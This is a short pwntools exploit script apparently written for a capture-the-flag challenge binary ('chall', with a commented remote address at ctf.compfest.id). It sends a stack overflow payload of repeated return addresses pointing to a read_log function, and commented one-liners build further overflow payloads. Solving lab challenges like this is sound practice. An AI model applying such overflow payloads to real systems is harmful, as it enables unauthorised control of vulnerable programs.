from pwn import *

#0000000000401206 <read_log>:
read_log_addrs = 0x401206
#0x0000000000401016 : ret
ret_gadjet = 0x401016
save_rbp = 0x401473

r = process("./chall")
# r = remote("ctf.compfest.id" ,7004)

# r.recvline_contains("call you?")
sleep(1)
r.send(p64(0x401206)*4)

#r < <(python -c "from pwn import *;sys.stdout.buffer.write( b'j' * 31 + b'\x00' + b'\x00' * 32 + p64(0x00007fffffffdd38) +p64(0x0000000000401473)  +16 * b'k' + p64(0x401206)*2  )"
payload = p64(0x401206)*5 

#r < <(python -c "from pwn import *;sys.stdout.buffer.write( b'jbelkerf\n' + b'\x00' * 0x28 + p64(0x401473) + p64(0x401206)  + b'\n')")
# r.recvline_contains("You do:")
r.send(payload)

r.interactive()